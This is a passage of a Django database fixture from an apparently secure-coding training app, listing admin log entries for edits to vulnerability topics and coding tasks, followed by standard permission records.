"pk": 176, "fields": {"action_time": "2024-04-26T08:44:54.937Z", "user": 1, "content_type": 7, "object_id": "22", "object_repr": "Vulnerability: Django templating", "action_flag": 2, "change_message": "[]"}}, {"model": "admin.logentry", "pk": 177, "fields": {"action_time": "2024-04-26T08:53:15.338Z", "user": 1, "content_type": 7, "object_id": "23", "object_repr": "Vulnerability: Flask protection", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 178, "fields": {"action_time": "2024-04-26T08:55:30.142Z", "user": 1, "content_type": 7, "object_id": "23", "object_repr": "Vulnerability: Flask protection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 179, "fields": {"action_time": "2024-04-26T09:29:37.087Z", "user": 1, "content_type": 7, "object_id": "24", "object_repr": "Vulnerability: Flask protection 2", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 180, "fields": {"action_time": "2024-04-28T10:25:40.670Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 181, "fields": {"action_time": "2024-04-28T10:26:03.527Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 182, "fields": {"action_time": "2024-04-28T11:07:20.896Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 183, "fields": {"action_time": "2024-04-28T11:07:50.324Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 184, "fields": {"action_time": "2024-04-28T11:08:42.283Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 185, "fields": {"action_time": "2024-04-28T11:15:09.003Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 186, "fields": {"action_time": "2024-04-28T11:16:21.372Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 187, "fields": {"action_time": "2024-04-28T11:17:29.029Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[]"}}, {"model": "admin.logentry", "pk": 188, "fields": {"action_time": "2024-04-28T11:19:43.213Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 189, "fields": {"action_time": "2024-04-29T09:56:49.075Z", "user": 1, "content_type": 7, "object_id": "22", "object_repr": "Vulnerability: Django templating", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Lang\"]}}]"}}, {"model": "admin.logentry", "pk": 190, "fields": {"action_time": "2024-04-29T09:56:56.720Z", "user": 1, "content_type": 7, "object_id": "23", "object_repr": "Vulnerability: Flask protection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Lang\"]}}]"}}, {"model": "admin.logentry", "pk": 191, "fields": {"action_time": "2024-04-29T11:15:37.820Z", "user": 1, "content_type": 7, "object_id": "25", "object_repr": "Vulnerability: test", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 192, "fields": {"action_time": "2024-04-30T09:25:48.327Z", "user": 1, "content_type": 7, "object_id": "17", "object_repr": "Vulnerability: Add book sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Solution\"]}}]"}}, {"model": "admin.logentry", "pk": 193, "fields": {"action_time": "2024-04-30T09:34:45.011Z", "user": 1, "content_type": 7, "object_id": "18", "object_repr": "Vulnerability: Login sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Solution\", \"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 194, "fields": {"action_time": "2024-04-30T09:35:45.326Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: Get task postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 195, "fields": {"action_time": "2024-04-30T09:36:46.949Z", "user": 1, "content_type": 7, "object_id": "20", "object_repr": "Vulnerability: Get task postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Solution\"]}}]"}}, {"model": "admin.logentry", "pk": 196, "fields": {"action_time": "2024-04-30T09:38:52.386Z", "user": 1, "content_type": 7, "object_id": "21", "object_repr": "Vulnerability: Count rows postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 197, "fields": {"action_time": "2024-04-30T09:39:08.513Z", "user": 1, "content_type": 7, "object_id": "21", "object_repr": "Vulnerability: Count rows postgresql", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Solution\"]}}]"}}, {"model": "admin.logentry", "pk": 198, "fields": {"action_time": "2024-04-30T09:48:38.618Z", "user": 1, "content_type": 7, "object_id": "22", "object_repr": "Vulnerability: Django templating", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\", \"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 199, "fields": {"action_time": "2024-04-30T09:50:44.793Z", "user": 1, "content_type": 7, "object_id": "23", "object_repr": "Vulnerability: Flask protection form", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Description\", \"Slug\", \"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 200, "fields": {"action_time": "2024-04-30T09:56:24.086Z", "user": 1, "content_type": 7, "object_id": "24", "object_repr": "Vulnerability: Flask protection 2", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\", \"Code task\", \"Solution\", \"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 201, "fields": {"action_time": "2024-04-30T09:57:46.134Z", "user": 1, "content_type": 7, "object_id": "24", "object_repr": "Vulnerability: Flask app protection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Slug\"]}}]"}}, {"model": "admin.logentry", "pk": 202, "fields": {"action_time": "2024-04-30T09:57:52.042Z", "user": 1, "content_type": 7, "object_id": "25", "object_repr": "Vulnerability: test", "action_flag": 3, "change_message": ""}}, {"model": "admin.logentry", "pk": 203, "fields": {"action_time": "2024-04-30T10:01:02.355Z", "user": 1, "content_type": 7, "object_id": "24", "object_repr": "Vulnerability: Flask app protection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 204, "fields": {"action_time": "2024-04-30T11:59:02.277Z", "user": 1, "content_type": 7, "object_id": "26", "object_repr": "Vulnerability: Java Server Pages", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 205, "fields": {"action_time": "2024-04-30T14:03:44.163Z", "user": 1, "content_type": 7, "object_id": "27", "object_repr": "Vulnerability: Django XSS", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 206, "fields": {"action_time": "2024-04-30T14:04:19.345Z", "user": 1, "content_type": 7, "object_id": "27", "object_repr": "Vulnerability: Django XSS", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Lang\"]}}]"}}, {"model": "admin.logentry", "pk": 207, "fields": {"action_time": "2024-04-30T14:05:40.908Z", "user": 1, "content_type": 7, "object_id": "27", "object_repr": "Vulnerability: Django XSS", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 208, "fields": {"action_time": "2024-04-30T14:10:22.657Z", "user": 1, "content_type": 7, "object_id": "28", "object_repr": "Vulnerability: 123", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 209, "fields": {"action_time": "2024-04-30T14:22:28.633Z", "user": 1, "content_type": 7, "object_id": "28", "object_repr": "Vulnerability: JavaScript parameterized best practice", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Description\", \"Slug\", \"Solution\", \"Hint\", \"Key words\", \"Lang\"]}}]"}}, {"model": "admin.logentry", "pk": 210, "fields": {"action_time": "2024-04-30T14:22:50.021Z", "user": 1, "content_type": 7, "object_id": "28", "object_repr": "Vulnerability: JavaScript parameterized best practice", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Vulnerability\"]}}]"}}, {"model": "admin.logentry", "pk": 211, "fields": {"action_time": "2024-04-30T14:23:38.447Z", "user": 1, "content_type": 7, "object_id": "28", "object_repr": "Vulnerability: JavaScript parameterized best practice", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 212, "fields": {"action_time": "2024-04-30T14:24:14.315Z", "user": 1, "content_type": 7, "object_id": "28", "object_repr": "Vulnerability: JavaScript parameterized best practice", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 213, "fields": {"action_time": "2024-05-04T08:43:43.186Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 214, "fields": {"action_time": "2024-05-04T09:14:04.304Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 215, "fields": {"action_time": "2024-05-04T09:17:04.651Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 216, "fields": {"action_time": "2024-05-04T09:18:35.381Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 217, "fields": {"action_time": "2024-05-04T09:20:34.913Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 218, "fields": {"action_time": "2024-05-04T09:44:27.543Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 219, "fields": {"action_time": "2024-05-04T09:44:57.760Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 220, "fields": {"action_time": "2024-05-04T10:15:33.377Z", "user": 1, "content_type": 8, "object_id": "7", "object_repr": "Vulnerability: Authentication", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 221, "fields": {"action_time": "2024-05-04T10:15:51.758Z", "user": 1, "content_type": 8, "object_id": "8", "object_repr": "Vulnerability: Business logic vulnerabilities", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 222, "fields": {"action_time": "2024-05-04T17:12:23.566Z", "user": 1, "content_type": 8, "object_id": "2", "object_repr": "Vulnerability: Cross-site scripting", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 223, "fields": {"action_time": "2024-05-04T17:13:39.210Z", "user": 1, "content_type": 8, "object_id": "2", "object_repr": "Vulnerability: Cross-site scripting", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 224, "fields": {"action_time": "2024-05-04T17:15:10.810Z", "user": 1, "content_type": 8, "object_id": "2", "object_repr": "Vulnerability: Cross-site scripting", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 225, "fields": {"action_time": "2024-05-04T17:15:55.732Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 226, "fields": {"action_time": "2024-05-04T17:16:06.836Z", "user": 1, "content_type": 8, "object_id": "2", "object_repr": "Vulnerability: Cross-site scripting", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 227, "fields": {"action_time": "2024-05-04T17:16:28.983Z", "user": 1, "content_type": 8, "object_id": "2", "object_repr": "Vulnerability: Cross-site scripting", "action_flag": 2, "change_message": "[]"}}, {"model": "admin.logentry", "pk": 228, "fields": {"action_time": "2024-05-04T17:16:37.915Z", "user": 1, "content_type": 8, "object_id": "6", "object_repr": "Vulnerability: DOM-based vulnerabilities", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 229, "fields": {"action_time": "2024-05-04T17:39:19.410Z", "user": 1, "content_type": 7, "object_id": "29", "object_repr": "Vulnerability: XSS cookies", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 230, "fields": {"action_time": "2024-05-04T18:10:29.466Z", "user": 1, "content_type": 7, "object_id": "29", "object_repr": "Vulnerability: XSS cookies", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Solution\"]}}]"}}, {"model": "admin.logentry", "pk": 231, "fields": {"action_time": "2024-05-04T18:50:42.128Z", "user": 1, "content_type": 7, "object_id": "30", "object_repr": "Vulnerability: innerHTML vulnerability", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 232, "fields": {"action_time": "2024-05-05T10:27:58.361Z", "user": 1, "content_type": 8, "object_id": "3", "object_repr": "Vulnerability: Cross-site request forgery", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 233, "fields": {"action_time": "2024-05-05T10:28:44.115Z", "user": 1, "content_type": 8, "object_id": "3", "object_repr": "Vulnerability: Cross-site request forgery", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 234, "fields": {"action_time": "2024-05-05T10:47:09.304Z", "user": 1, "content_type": 8, "object_id": "1", "object_repr": "Vulnerability: SQL injection", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 235, "fields": {"action_time": "2024-05-05T10:48:34.727Z", "user": 1, "content_type": 8, "object_id": "2", "object_repr": "Vulnerability: Cross-site scripting", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 236, "fields": {"action_time": "2024-05-05T11:09:06.149Z", "user": 1, "content_type": 8, "object_id": "4", "object_repr": "Vulnerability: Server-side request forgery (SSRF)", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 237, "fields": {"action_time": "2024-05-05T11:24:44.081Z", "user": 1, "content_type": 8, "object_id": "5", "object_repr": "Vulnerability: Clickjacking", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 238, "fields": {"action_time": "2024-05-05T11:38:08.762Z", "user": 1, "content_type": 8, "object_id": "7", "object_repr": "Vulnerability: Authentication", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 239, "fields": {"action_time": "2024-05-05T12:14:50.220Z", "user": 1, "content_type": 8, "object_id": "6", "object_repr": "Vulnerability: Memory safety vulnerabilities", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Vulnerability name\", \"Slug\", \"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 240, "fields": {"action_time": "2024-05-05T12:25:00.141Z", "user": 1, "content_type": 8, "object_id": "6", "object_repr": "Vulnerability: Memory safety vulnerabilities", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 241, "fields": {"action_time": "2024-05-05T14:16:58.498Z", "user": 1, "content_type": 8, "object_id": "8", "object_repr": "Vulnerability: Business logic vulnerabilities", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 242, "fields": {"action_time": "2024-05-05T15:33:08.638Z", "user": 1, "content_type": 8, "object_id": "5", "object_repr": "Vulnerability: Clickjacking", "action_flag": 2, "change_message": "[]"}}, {"model": "admin.logentry", "pk": 243, "fields": {"action_time": "2024-05-05T17:16:49.141Z", "user": 1, "content_type": 8, "object_id": "3", "object_repr": "Vulnerability: Cross-site request forgery (CSRF)", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Vulnerability name\"]}}]"}}, {"model": "admin.logentry", "pk": 244, "fields": {"action_time": "2024-05-05T17:17:03.056Z", "user": 1, "content_type": 8, "object_id": "2", "object_repr": "Vulnerability: Cross-site scripting (XSS)", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Vulnerability name\", \"Slug\"]}}]"}}, {"model": "admin.logentry", "pk": 245, "fields": {"action_time": "2024-05-05T18:17:50.059Z", "user": 1, "content_type": 7, "object_id": "31", "object_repr": "Vulnerability: Key access", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 246, "fields": {"action_time": "2024-05-05T18:29:12.144Z", "user": 1, "content_type": 7, "object_id": "32", "object_repr": "Vulnerability: Secure password validation", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 247, "fields": {"action_time": "2024-05-05T18:41:56.709Z", "user": 1, "content_type": 7, "object_id": "33", "object_repr": "Vulnerability: Off-by-One vulnerability", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 248, "fields": {"action_time": "2024-05-08T19:46:58.373Z", "user": 1, "content_type": 7, "object_id": "34", "object_repr": "Vulnerability: ╤++ array", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 249, "fields": {"action_time": "2024-05-08T19:59:34.423Z", "user": 1, "content_type": 7, "object_id": "35", "object_repr": "Vulnerability: Login sqlite", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 250, "fields": {"action_time": "2024-05-08T20:10:46.778Z", "user": 1, "content_type": 7, "object_id": "18", "object_repr": "Vulnerability: Get product range sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\", \"Description\", \"Slug\", \"Code task\", \"Solution\", \"Hint\", \"Key words\"]}}]"}}, {"model": "admin.logentry", "pk": 251, "fields": {"action_time": "2024-05-08T20:11:03.694Z", "user": 1, "content_type": 7, "object_id": "35", "object_repr": "Vulnerability: Login sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Slug\"]}}]"}}, {"model": "admin.logentry", "pk": 252, "fields": {"action_time": "2024-05-08T20:11:33.847Z", "user": 1, "content_type": 7, "object_id": "35", "object_repr": "Vulnerability: Login sqlite", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Vulnerability\"]}}]"}}, {"model": "admin.logentry", "pk": 253, "fields": {"action_time": "2024-05-11T09:34:59.877Z", "user": 1, "content_type": 7, "object_id": "36", "object_repr": "Vulnerability: Secure region data", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 254, "fields": {"action_time": "2024-05-11T09:36:29.155Z", "user": 1, "content_type": 7, "object_id": "36", "object_repr": "Vulnerability: Secure region data", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Code task\", \"Solution\"]}}]"}}, {"model": "admin.logentry", "pk": 255, "fields": {"action_time": "2024-05-11T09:37:52.005Z", "user": 1, "content_type": 7, "object_id": "36", "object_repr": "Vulnerability: Secure region data", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Solution\"]}}]"}}, {"model": "admin.logentry", "pk": 256, "fields": {"action_time": "2024-05-11T10:02:53.833Z", "user": 1, "content_type": 7, "object_id": "37", "object_repr": "Vulnerability: User info by id", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 257, "fields": {"action_time": "2024-05-11T11:18:51.854Z", "user": 1, "content_type": 7, "object_id": "38", "object_repr": "Vulnerability: Allowed domains", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 258, "fields": {"action_time": "2024-05-11T11:22:18.659Z", "user": 1, "content_type": 7, "object_id": "38", "object_repr": "Vulnerability: Allowed domains", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\", \"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 259, "fields": {"action_time": "2024-05-11T11:50:17.676Z", "user": 1, "content_type": 7, "object_id": "39", "object_repr": "Vulnerability: Django 404", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 260, "fields": {"action_time": "2024-05-11T11:59:13.514Z", "user": 1, "content_type": 7, "object_id": "40", "object_repr": "Vulnerability: Secret key", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 261, "fields": {"action_time": "2024-05-11T12:14:15.095Z", "user": 1, "content_type": 7, "object_id": "41", "object_repr": "Vulnerability: Task editor", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 262, "fields": {"action_time": "2024-05-11T15:26:30.037Z", "user": 1, "content_type": 7, "object_id": "42", "object_repr": "Vulnerability: iframe not allowed", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 263, "fields": {"action_time": "2024-05-11T15:48:21.119Z", "user": 1, "content_type": 7, "object_id": "43", "object_repr": "Vulnerability: Forms iframe", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 264, "fields": {"action_time": "2024-05-11T15:48:51.554Z", "user": 1, "content_type": 7, "object_id": "43", "object_repr": "Vulnerability: Forms iframe", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 265, "fields": {"action_time": "2024-05-11T18:25:48.431Z", "user": 1, "content_type": 7, "object_id": "44", "object_repr": "Vulnerability: Admin access", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 266, "fields": {"action_time": "2024-05-11T19:13:42.271Z", "user": 1, "content_type": 7, "object_id": "45", "object_repr": "Vulnerability: Account deposit", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 267, "fields": {"action_time": "2024-05-11T19:22:34.451Z", "user": 1, "content_type": 7, "object_id": "45", "object_repr": "Vulnerability: Account deposit", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\", \"Hint\"]}}]"}}, {"model": "admin.logentry", "pk": 268, "fields": {"action_time": "2024-05-11T20:10:21.404Z", "user": 1, "content_type": 7, "object_id": "46", "object_repr": "Vulnerability: Allowed domains iframe", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 269, "fields": {"action_time": "2024-05-14T09:39:09.837Z", "user": 1, "content_type": 7, "object_id": "47", "object_repr": "Vulnerability: New user", "action_flag": 1, "change_message": "[{\"added\": {}}]"}}, {"model": "admin.logentry", "pk": 270, "fields": {"action_time": "2024-05-22T19:27:11.239Z", "user": 1, "content_type": 7, "object_id": "34", "object_repr": "Vulnerability: C++ array", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Task name\"]}}]"}}, {"model": "admin.logentry", "pk": 271, "fields": {"action_time": "2024-06-11T10:47:00.943Z", "user": 1, "content_type": 8, "object_id": "5", "object_repr": "Vulnerability: Clickjacking", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\"]}}]"}}, {"model": "admin.logentry", "pk": 272, "fields": {"action_time": "2024-06-11T10:51:38.085Z", "user": 1, "content_type": 7, "object_id": "39", "object_repr": "Vulnerability: Django 404", "action_flag": 2, "change_message": "[{\"changed\": {\"fields\": [\"Description\", \"Code task\", \"Solution\", \"Hint\"]}}]"}}, {"model": "auth.permission", "pk": 1, "fields": {"name": "Can add log entry", "content_type": 1, "codename": "add_logentry"}}, {"model": "auth.permission", "pk": 2, "fields": {"name": "Can change log entry", "content_type": 1, "codename": "change_logentry"}}, {"model": "auth.permission", "pk": 3, "fields": {"name": "Can delete log entry", "content_type": 1, "codename": "delete_logentry"}}, {"model": "auth.permission", "pk": 4, "fields": {"name": "Can view log entry", "content_type": 1, "codename": "view_logentry"}}, {"model": "auth.permission", "pk": 5, "fields": {"name": "Can add permission", "content_type": 2, "codename": "add_permission"}}, {"model": "auth.permission", "pk": 6, "fields": {"name": "Can change permission", "content_type": 2, "codename": "change_permission"}}, {"model": "auth.permission", "pk": 7, "fields": {"name": "Can delete permission", "content_type": 2, "codename": "delete_permission"}}, {"model": "auth.permission", "pk": 8, "fields": {"name": "Can view permission", "content_type": 2, "codename": "view_permission"}}, {"model": "auth.permission", "pk": 9, "fields": {"name": "Can add group", "content_type": 3, "codename": "add_group"}}, {"model": "auth.permission", "pk": 10, "fields": {"name": "Can change group", "content_type": 3, "codename": "change_group"}}, {"model": "auth.permission", "pk": 11, "fields": {"name": "Can delete group", "content_type": 3, "codename": "delete_group"}}, {"model": "auth.permission", "pk": 12, "fields": {"name": "Can view group", "content_type": 3, "codename": "view_group"}}, {"model": "auth.permission", "pk": 13, "fields": {"name": "Can add user", "content_type": 4, "codename": "add_user"}}, {"model": "auth.permission", "pk": 14, "fields": {"name": "Can change user", "content_type": 4, "codename": "change_user"}}, {"model": "auth.permission", "pk": 15, "fields": {"name": "Can delete user", "content_type": 4, "codename": "delete_user"}}, {"model": "auth.permission", "pk": 16, "fields": {"name": "Can view user", "content_type": 4, "codename": "view_user"}}, {"model": "auth.permission", "pk": 17, "fields": {"name": "Can add content type", "content_type": 5, "codename": "add_contenttype"}}, {"model": "auth.permission", "pk": 18, "fields": {"name": "Can change content type", "content_type": 5, "codename": "change_contenttype"}}, {"model": "auth.permission", "pk": 19, "fields": {"name": "Can delete content type", "content_type": 5, "codename": "delete_contenttype"}}, {"model": "auth.permission", "pk": 20, "fields": {"name": "Can view content type", "content_type": 5, "codename": "view_contenttype"}}, {"model": "auth.permission", "pk": 21, "fields": {"name": "Can add session", "content_type": 6, "codename": "add_session"}}, {"model": "auth.permission", "pk": 22, "fields": {"name": "Can change session", "content_type": 6, "codename": "change_session"}}, {"model": "auth.permission", "pk": 23, "fields": {"name": "Can delete session", "content_type": 6, "codename": "delete_session"}}, {"model": "auth.permission", "pk": 24, "fields": {"name": "Can view session", "content_type": 6, "codename": "view_session"}}, {"model": "auth.permission", "pk": 25, "fields": {"name": "Can add task", "content_type": 7, "codename": "add_task"}}, {"model": "auth.permission", "pk": 26, "fields": {"name": "Can change task", "content_type": 7, "codename": "change_task"}}, {"model": "auth.permission", "pk": 27, "fields": {"name": "Can delete task", "content_type": 7, "codename": "delete_task"}}, {"model": "auth.permission", "pk": 28, "fields": {"name": "Can view task", "content_type": 7, "codename": "view_task"}}, {"model": "auth.permission", "pk": 29, "fields": {"name": "Can add vulnerability", "content_type": 8, "codename": "add_vulnerability"}}, {"model": "auth.permission", "pk": 30, "fields": {"name": "Can change vulnerability", "content_type": 8, "codename": "change_vulnerability"}}, {"model": "auth.permission", "pk": 31, "fields": {"name": "Can delete vulnerability", "content_type": 8, "codename": "delete_vulnerability"}}, {"model": "auth.permission", "pk": 32, "fields": {"name": "Can view vulnerability", "content_type": 8, "codename": "view_vulnerability"}}, {"model": "auth.permission", "pk": 33, "fields": {"name": "Can add solved task", "content_type": 9, "codename": "add_solvedtask"}}, {"model": "auth.permission", "pk": 34, "fields": {"name": "Can change solved task", "content_type": 9, "codename": "change_solvedtask"}}, {"model": "auth.permission", "pk": 35, "fields": {"name": "Can delete solved task", "content_type": 9, "codename": "delete_solvedtask"}}, {"model": "auth.permission", "pk": 36, "fields": {"name": "Can view solved task", "content_type": 9, "codename": "view_solvedtask"}}, {"model": "auth.permission", "pk": 37, "fields": {"name": "Can add gpt question", "content_type": 10, "codename": "add_gptquestion"}}, {"model": "auth.permission", "pk": 38, "fields": {"name": "Can change gpt question", "content_type": 10, "codename": "change_gptquestion"}}, {"model": "auth.permission", "pk": 39, "fields": {"name": "Can delete gpt question", "content_type": 